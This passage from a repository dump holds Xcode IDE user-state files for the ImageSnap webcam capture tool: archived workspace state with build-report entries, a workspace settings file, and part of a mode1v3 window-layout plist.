			<string>LLVM compiler 2.1 - Warnings||GCC_WARN_UNUSED_LABEL</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Warnings||GCC_WARN_UNUSED_PARAMETER</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Warnings||GCC_WARN_UNUSED_VALUE</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Warnings||GCC_WARN_UNUSED_VARIABLE</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Warnings||GCC_WARN_ABOUT_DEPRECATED_FUNCTIONS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Warnings||GCC_WARN_ABOUT_INVALID_OFFSETOF_MACRO</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>122</integer>
			</dict>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>542</integer>
				</dict>
			</array>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>Architectures||VALID_ARCHS</string>
		</dict>
		<dict>
			<key>$classes</key>
			<array>
				<string>Xcode3ProjectDocumentLocation</string>
				<string>DVTDocumentLocation</string>
				<string>NSObject</string>
			</array>
			<key>$classname</key>
			<string>Xcode3ProjectDocumentLocation</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>94</integer>
			</dict>
			<key>NS.keys</key>
			<array/>
			<key>NS.objects</key>
			<array/>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>94</integer>
			</dict>
			<key>NS.keys</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>546</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>547</integer>
				</dict>
			</array>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>549</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>553</integer>
				</dict>
			</array>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>93</integer>
			</dict>
			<key>NS.base</key>
			<dict>
				<key>CF$UID</key>
				<integer>0</integer>
			</dict>
			<key>NS.relative</key>
			<dict>
				<key>CF$UID</key>
				<integer>48</integer>
			</dict>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>93</integer>
			</dict>
			<key>NS.base</key>
			<dict>
				<key>CF$UID</key>
				<integer>0</integer>
			</dict>
			<key>NS.relative</key>
			<dict>
				<key>CF$UID</key>
				<integer>548</integer>
			</dict>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>file://localhost/Users/rob/Documents/iHarder_SVN_Checkout/imagesnap/ImageSnap.h</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>94</integer>
			</dict>
			<key>NS.keys</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>81</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>82</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>83</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>84</integer>
				</dict>
			</array>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>550</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>551</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>87</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>552</integer>
				</dict>
			</array>
		</dict>
		<real>335465254.95291799</real>
		<string>{18622, 1553}</string>
		<string>{19264, 0}</string>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>94</integer>
			</dict>
			<key>NS.keys</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>554</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>555</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>556</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>557</integer>
				</dict>
			</array>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>558</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>559</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>87</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>560</integer>
				</dict>
			</array>
		</dict>
		<string>PrimaryDocumentTimestamp</string>
		<string>PrimaryDocumentVisibleCharacterRange</string>
		<string>HideAllIssues</string>
		<string>PrimaryDocumentSelectedCharacterRange</string>
		<real>335464097.33748102</real>
		<string>{0, 1114}</string>
		<string>{375, 0}</string>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>94</integer>
			</dict>
			<key>NS.keys</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>562</integer>
				</dict>
			</array>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>564</integer>
				</dict>
			</array>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>93</integer>
			</dict>
			<key>NS.base</key>
			<dict>
				<key>CF$UID</key>
				<integer>0</integer>
			</dict>
			<key>NS.relative</key>
			<dict>
				<key>CF$UID</key>
				<integer>563</integer>
			</dict>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>file://localhost/Users/rob/Library/Developer/Xcode/DerivedData/ImageSnap-ctdbfkdavafpqaekpzweozbebzfs/Build/Products/Debug/imagesnap</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>94</integer>
			</dict>
			<key>NS.keys</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>565</integer>
				</dict>
			</array>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>566</integer>
				</dict>
			</array>
		</dict>
		<string>SelectedDocumentLocations</string>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>15</integer>
			</dict>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>567</integer>
				</dict>
			</array>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>570</integer>
			</dict>
			<key>IDEQuickLookPageNumber</key>
			<dict>
				<key>CF$UID</key>
				<integer>46</integer>
			</dict>
			<key>documentURL</key>
			<dict>
				<key>CF$UID</key>
				<integer>568</integer>
			</dict>
			<key>timestamp</key>
			<dict>
				<key>CF$UID</key>
				<integer>569</integer>
			</dict>
		</dict>
		<string>file://localhost/Users/rob/Library/Developer/Xcode/DerivedData/ImageSnap-ctdbfkdavafpqaekpzweozbebzfs/Build/Products/Debug/imagesnap</string>
		<real>335464328.57412702</real>
		<dict>
			<key>$classes</key>
			<array>
				<string>IDEQuickLookDocumentLocation</string>
				<string>DVTDocumentLocation</string>
				<string>NSObject</string>
			</array>
			<key>$classname</key>
			<string>IDEQuickLookDocumentLocation</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>94</integer>
			</dict>
			<key>NS.keys</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>572</integer>
				</dict>
			</array>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>574</integer>
				</dict>
			</array>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>93</integer>
			</dict>
			<key>NS.base</key>
			<dict>
				<key>CF$UID</key>
				<integer>0</integer>
			</dict>
			<key>NS.relative</key>
			<dict>
				<key>CF$UID</key>
				<integer>573</integer>
			</dict>
		</dict>
		<string>x-xcode-log://DF69A59E-791E-4463-958D-AF870A73922A</string>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>94</integer>
			</dict>
			<key>NS.keys</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>565</integer>
				</dict>
			</array>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>575</integer>
				</dict>
			</array>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>15</integer>
			</dict>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>576</integer>
				</dict>
			</array>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>581</integer>
			</dict>
			<key>documentURL</key>
			<dict>
				<key>CF$UID</key>
				<integer>573</integer>
			</dict>
			<key>expandTranscript</key>
			<false/>
			<key>indexPath</key>
			<dict>
				<key>CF$UID</key>
				<integer>577</integer>
			</dict>
			<key>timestamp</key>
			<dict>
				<key>CF$UID</key>
				<integer>0</integer>
			</dict>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>580</integer>
			</dict>
			<key>NSIndexPathData</key>
			<dict>
				<key>CF$UID</key>
				<integer>578</integer>
			</dict>
			<key>NSIndexPathLength</key>
			<integer>2</integer>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>579</integer>
			</dict>
			<key>NS.data</key>
			<data>
			AAE=
			</data>
		</dict>
		<dict>
			<key>$classes</key>
			<array>
				<string>NSMutableData</string>
				<string>NSData</string>
				<string>NSObject</string>
			</array>
			<key>$classname</key>
			<string>NSMutableData</string>
		</dict>
		<dict>
			<key>$classes</key>
			<array>
				<string>NSIndexPath</string>
				<string>NSObject</string>
			</array>
			<key>$classname</key>
			<string>NSIndexPath</string>
		</dict>
		<dict>
			<key>$classes</key>
			<array>
				<string>IDELogDocumentLocation</string>
				<string>DVTDocumentLocation</string>
				<string>NSObject</string>
			</array>
			<key>$classname</key>
			<string>IDELogDocumentLocation</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>94</integer>
			</dict>
			<key>NS.keys</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>583</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>584</integer>
				</dict>
			</array>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>585</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>586</integer>
				</dict>
			</array>
		</dict>
		<string>IDEDeviceLocation</string>
		<string>IDEDeviceArchitecture</string>
		<string>dvtdevice-local-computer:localhost</string>
		<string>x86_64</string>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>94</integer>
			</dict>
			<key>NS.keys</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>588</integer>
				</dict>
			</array>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>589</integer>
				</dict>
			</array>
		</dict>
		<string>IDENameString</string>
		<string>imagesnap</string>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>94</integer>
			</dict>
			<key>NS.keys</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>591</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>592</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>593</integer>
				</dict>
			</array>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>594</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>619</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>620</integer>
				</dict>
			</array>
		</dict>
		<string>IDEActivityReportCompletionSummaryStringSegments</string>
		<string>IDEActivityReportOptions</string>
		<string>IDEActivityReportTitle</string>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>122</integer>
			</dict>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>595</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>602</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>606</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>610</integer>
				</dict>
			</array>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>94</integer>
			</dict>
			<key>NS.keys</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>596</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>597</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>598</integer>
				</dict>
			</array>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>599</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>600</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>601</integer>
				</dict>
			</array>
		</dict>
		<string>IDEActivityReportStringSegmentPriority</string>
		<string>IDEActivityReportStringSegmentBackSeparator</string>
		<string>IDEActivityReportStringSegmentStringValue</string>
		<real>2</real>
		<string> </string>
		<string>Build</string>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>94</integer>
			</dict>
			<key>NS.keys</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>596</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>597</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>598</integer>
				</dict>
			</array>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>603</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>604</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>605</integer>
				</dict>
			</array>
		</dict>
		<real>4</real>
		<string>: </string>
		<string>imagesnap</string>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>94</integer>
			</dict>
			<key>NS.keys</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>596</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>597</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>598</integer>
				</dict>
			</array>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>607</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>608</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>609</integer>
				</dict>
			</array>
		</dict>
		<real>1</real>
		<string> │ </string>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>579</integer>
			</dict>
			<key>NS.data</key>
			<data>
			YnBsaXN0MDDUAQIDBAUGOzxYJHZlcnNpb25YJG9iamVjdHNZJGFy
			Y2hpdmVyVCR0b3ASAAGGoK0HCA8QGhscJCUrMTQ3VSRudWxs0wkK
			CwwNDlxOU0F0dHJpYnV0ZXNWJGNsYXNzWE5TU3RyaW5ngAOADIAC
			WVN1Y2NlZWRlZNMKERITFBdXTlMua2V5c1pOUy5vYmplY3RzgAui
			FRaABIAFohgZgAaACVZOU0ZvbnRXTlNDb2xvctQKHR4fICEiI1ZO
			U05hbWVWTlNTaXplWE5TZkZsYWdzgAiAByNAJgAAAAAAABENEF8Q
			EUx1Y2lkYUdyYW5kZS1Cb2xk0iYnKClaJGNsYXNzbmFtZVgkY2xh
			c3Nlc1ZOU0ZvbnSiKCpYTlNPYmplY3TTCiwtLi8wXE5TQ29sb3JT
			cGFjZVdOU1doaXRlgAoQA0IwANImJzIzV05TQ29sb3KiMirSJic1
			NlxOU0RpY3Rpb25hcnmiNSrSJic4OV8QEk5TQXR0cmlidXRlZFN0
			cmluZ6I6Kl8QEk5TQXR0cmlidXRlZFN0cmluZ18QD05TS2V5ZWRB
			cmNoaXZlctE9PlRyb290gAEACAARABoAIwAtADIANwBFAEsAUgBf
			AGYAbwBxAHMAdQB/AIYAjgCZAJsAngCgAKIApQCnAKkAsAC4AMEA
			yADPANgA2gDcAOUA6AD8AQEBDAEVARwBHwEoAS8BPAFEAUYBSAFL
			AVABWAFbAWABbQFwAXUBigGNAaIBtAG3AbwAAAAAAAACAQAAAAAA
			AAA/AAAAAAAAAAAAAAAAAAABvg==
			</data>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>94</integer>
			</dict>
			<key>NS.keys</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>596</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>611</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>612</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>598</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>613</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>614</integer>
				</dict>
			</array>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>615</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>104</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>616</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>618</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>104</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>104</integer>
				</dict>
			</array>
		</dict>
		<string>IDEActivityReportStringSegmentType</string>
		<string>IDEActivityReportStringSegmentDate</string>
		<string>IDEActivityReportStringSegmentDateStyle</string>
		<string>IDEActivityReportStringSegmentTimeStyle</string>
		<real>3</real>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>617</integer>
			</dict>
			<key>NS.time</key>
			<real>335465249.94886398</real>
		</dict>
		<dict>
			<key>$classes</key>
			<array>
				<string>NSDate</string>
				<string>NSObject</string>
			</array>
			<key>$classname</key>
			<string>NSDate</string>
		</dict>
		<string>Today at 9:47 AM</string>
		<integer>234</integer>
		<string>imagesnap</string>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>122</integer>
			</dict>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>2</integer>
				</dict>
			</array>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>94</integer>
			</dict>
			<key>NS.keys</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>572</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>623</integer>
				</dict>
			</array>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>625</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>630</integer>
				</dict>
			</array>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>93</integer>
			</dict>
			<key>NS.base</key>
			<dict>
				<key>CF$UID</key>
				<integer>0</integer>
			</dict>
			<key>NS.relative</key>
			<dict>
				<key>CF$UID</key>
				<integer>624</integer>
			</dict>
		</dict>
		<string>file://localhost/Users/rob/Documents/iHarder_SVN_Checkout/imagesnap/ImageSnap.m</string>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>89</integer>
			</dict>
			<key>NS.keys</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>626</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>627</integer>
				</dict>
			</array>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>628</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>629</integer>
				</dict>
			</array>
		</dict>
		<string>width</string>
		<string>height</string>
		<real>600</real>
		<real>600</real>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>89</integer>
			</dict>
			<key>NS.keys</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>626</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>627</integer>
				</dict>
			</array>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>631</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>632</integer>
				</dict>
			</array>
		</dict>
		<real>600</real>
		<real>600</real>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>122</integer>
			</dict>
			<key>NS.objects</key>
			<array>
				<dict>
					<key>CF$UID</key>
					<integer>634</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>636</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>572</integer>
				</dict>
				<dict>
					<key>CF$UID</key>
					<integer>637</integer>
				</dict>
			</array>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>93</integer>
			</dict>
			<key>NS.base</key>
			<dict>
				<key>CF$UID</key>
				<integer>0</integer>
			</dict>
			<key>NS.relative</key>
			<dict>
				<key>CF$UID</key>
				<integer>635</integer>
			</dict>
		</dict>
		<string>file://localhost/Users/rob/Documents/iHarder_SVN_Checkout/imagesnap/ImageSnap.m</string>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>93</integer>
			</dict>
			<key>NS.base</key>
			<dict>
				<key>CF$UID</key>
				<integer>0</integer>
			</dict>
			<key>NS.relative</key>
			<dict>
				<key>CF$UID</key>
				<integer>254</integer>
			</dict>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>93</integer>
			</dict>
			<key>NS.base</key>
			<dict>
				<key>CF$UID</key>
				<integer>0</integer>
			</dict>
			<key>NS.relative</key>
			<dict>
				<key>CF$UID</key>
				<integer>638</integer>
			</dict>
		</dict>
		<string>file://localhost/Users/rob/Documents/iHarder_SVN_Checkout/imagesnap/ImageSnap.h</string>
	</array>
	<key>$top</key>
	<dict>
		<key>State</key>
		<dict>
			<key>CF$UID</key>
			<integer>1</integer>
		</dict>
	</dict>
	<key>$version</key>
	<integer>100000</integer>
</dict>
</plist>

```

`Tools/ImageSnap-v0.2.5/ImageSnap.xcodeproj/project.xcworkspace/xcuserdata/rob.xcuserdatad/WorkspaceSettings.xcsettings`:

```xcsettings
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>IDEWorkspaceUserSettings_HasAskedToTakeAutomaticSnapshotBeforeSignificantChanges</key>
	<true/>
	<key>IDEWorkspaceUserSettings_SnapshotAutomaticallyBeforeSignificantChanges</key>
	<true/>
</dict>
</plist>

```

`Tools/ImageSnap-v0.2.5/ImageSnap.xcodeproj/rob.mode1v3`:

```mode1v3
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>ActivePerspectiveName</key>
	<string>Project</string>
	<key>AllowedModules</key>
	<array>
		<dict>
			<key>BundleLoadPath</key>
			<string></string>
			<key>MaxInstances</key>
			<string>n</string>
			<key>Module</key>
			<string>PBXSmartGroupTreeModule</string>
			<key>Name</key>
			<string>Groups and Files Outline View</string>
		</dict>
		<dict>
			<key>BundleLoadPath</key>
			<string></string>
			<key>MaxInstances</key>
			<string>n</string>
			<key>Module</key>
			<string>PBXNavigatorGroup</string>
			<key>Name</key>
			<string>Editor</string>
		</dict>
		<dict>
			<key>BundleLoadPath</key>
			<string></string>
			<key>MaxInstances</key>
			<string>n</string>
			<key>Module</key>
			<string>XCTaskListModule</string>
			<key>Name</key>
			<string>Task List</string>
		</dict>
		<dict>
			<key>BundleLoadPath</key>
			<string></string>
			<key>MaxInstances</key>
			<string>n</string>
			<key>Module</key>
			<string>XCDetailModule</string>
			<key>Name</key>
			<string>File and Smart Group Detail Viewer</string>
		</dict>
		<dict>
			<key>BundleLoadPath</key>
			<string></string>
			<key>MaxInstances</key>
			<string>1</string>
			<key>Module</key>
			<string>PBXBuildResultsModule</string>
			<key>Name</key>
			<string>Detailed Build Results Viewer</string>
		</dict>
		<dict>
			<key>BundleLoadPath</key>
			<string></string>
			<key>MaxInstances</key>
			<string>1</string>
			<key>Module</key>
			<string>PBXProjectFindModule</string>
			<key>Name</key>
			<string>Project Batch Find Tool</string>
		</dict>
		<dict>
			<key>BundleLoadPath</key>
			<string></string>
			<key>MaxInstances</key>
			<string>n</string>
			<key>Module</key>
			<string>XCProjectFormatConflictsModule</string>
			<key>Name</key>
			<string>Project Format Conflicts List</string>
		</dict>
		<dict>
			<key>BundleLoadPath</key>
			<string></string>
			<key>MaxInstances</key>
			<string>n</string>
			<key>Module</key>
			<string>PBXBookmarksModule</string>
			<key>Name</key>
			<string>Bookmarks Tool</string>
		</dict>
		<dict>
			<key>BundleLoadPath</key>
			<string></string>
			<key>MaxInstances</key>
			<string>n</string>
			<key>Module</key>
			<string>PBXClassBrowserModule</string>
			<key>Name</key>
			<string>Class Browser</string>
		</dict>
		<dict>
			<key>BundleLoadPath</key>
			<string></string>
			<key>MaxInstances</key>
			<string>n</string>
			<key>Module</key>
			<string>PBXCVSModule</string>
			<key>Name</key>
			<string>Source Code Control Tool</string>
		</dict>
		<dict>
			<key>BundleLoadPath</key>
			<string></string>
			<key>MaxInstances</key>
			<string>n</string>
			<key>Module</key>
			<string>PBXDebugBreakpointsModule</string>
			<key>Name</key>
			<string>Debug Breakpoints Tool</string>
		</dict>
		<dict>
			<key>BundleLoadPath</key>
			<string></string>
			<key>MaxInstances</key>
			<string>n</string>
			<key>Module</key>
			<string>XCDockableInspector</string>
			<key>Name</key>
			<string>Inspector</string>
		</dict>
		<dict>
			<key>BundleLoadPath</key>
			<string></string>
			<key>MaxInstances</key>
			<string>n</string>
			<key>Module</key>
			<string>PBXOpenQuicklyModule</string>
			<key>Name</key>
			<string>Open Quickly Tool</string>
		</dict>
		<dict>
			<key>BundleLoadPath</key>
			<string></string>
			<key>MaxInstances</key>
			<string>1</string>
			<key>Module</key>
			<string>PBXDebugSessionModule</string>
			<key>Name</key>
			<string>Debugger</string>
		</dict>
		<dict>
			<key>BundleLoadPath</key>
			<string></string>
			<key>MaxInstances</key>
			<string>1</string>
			<key>Module</key>
			<string>PBXDebugCLIModule</string>
			<key>Name</key>
			<string>Debug Console</string>
		</dict>
		<dict>
			<key>BundleLoadPath</key>
			<string></string>
			<key>MaxInstances</key>
			<string>n</string>
			<key>Module</key>
			<string>XCSnapshotModule</string>
			<key>Name</key>
			<string>Snapshots Tool</string>
		</dict>
	</array>
	<key>BundlePath</key>
	<string>/Developer/Library/PrivateFrameworks/DevToolsInterface.framework/Resources</string>
	<key>Description</key>
	<string>DefaultDescriptionKey</string>
	<key>DockingSystemVisible</key>
	<false/>
	<key>Extension</key>
	<string>mode1v3</string>
	<key>FavBarConfig</key>
	<dict>
		<key>PBXProjectModuleGUID</key>
		<string>D48172A7105D8CB100C394D7</string>
		<key>XCBarModuleItemNames</key>
		<dict/>
		<key>XCBarModuleItems</key>
		<array/>
	</dict>
	<key>FirstTimeWindowDisplayed</key>
	<false/>
	<key>Identifier</key>
	<string>com.apple.perspectives.project.mode1v3</string>
	<key>MajorVersion</key>
	<integer>33</integer>
	<key>MinorVersion</key>
	<integer>0</integer>
	<key>Name</key>
	<string>Default</string>
	<key>Notifications</key>
	<array/>
	<key>OpenEditors</key>
	<array/>
	<key>PerspectiveWidths</key>
	<array>
		<integer>-1</integer>
		<integer>-1</integer>
	</array>
	<key>Perspectives</key>
	<array>
		<dict>
			<key>ChosenToolbarItems</key>
			<array>
				<string>active-combo-popup</string>
				<string>action</string>
				<string>NSToolbarFlexibleSpaceItem</string>
				<string>debugger-enable-breakpoints</string>
				<string>build-and-go</string>
				<string>com.apple.ide.PBXToolbarStopButton</string>
				<string>get-info</string>
				<string>NSToolbarFlexibleSpaceItem</string>
				<string>com.apple.pbx.toolbar.searchfield</string>
			</array>
			<key>ControllerClassBaseName</key>
			<string></string>
			<key>IconName</key>
			<string>WindowOfProjectWithEditor</string>
			<key>Identifier</key>
			<string>perspective.project</string>
			<key>IsVertical</key>
			<false/>
			<key>Layout</key>
			<array>
				<dict>
					<key>ContentConfiguration</key>
					<dict>
						<key>PBXBottomSmartGroupGIDs</key>
						<array>
							<string>1C37FBAC04509CD000000102</string>
							<string>1C37FAAC04509CD000000102</string>
							<string>1C37FABC05509CD000000102</string>
							<string>1C37FABC05539CD112110102</string>
							<string>E2644B35053B69B200211256</string>
							<string>1C37FABC04509CD000100104</string>
							<string>1CC0EA4004350EF90044410B</string>
							<string>1CC0EA4004350EF90041110B</string>
						</array>
						<key>PBXProjectModuleGUID</key>
						<string>1CE0B1FE06471DED0097A5F4</string>
						<key>PBXProjectModuleLabel</key>
						<string>Files</string>
						<key>PBXProjectStructureProvided</key>
						<string>yes</string>
						<key>PBXSmartGroupTreeModuleColumnData</key>
						<dict>
							<key>PBXSmartGroupTreeModuleColumnWidthsKey</key>
							<array>
								<real>22</real>
								<real>164</real>
							</array>
							<key>PBXSmartGroupTreeModuleColumnsKey_v4</key>
							<array>
								<string>SCMStatusColumn</string>
								<string>MainColumn</string>
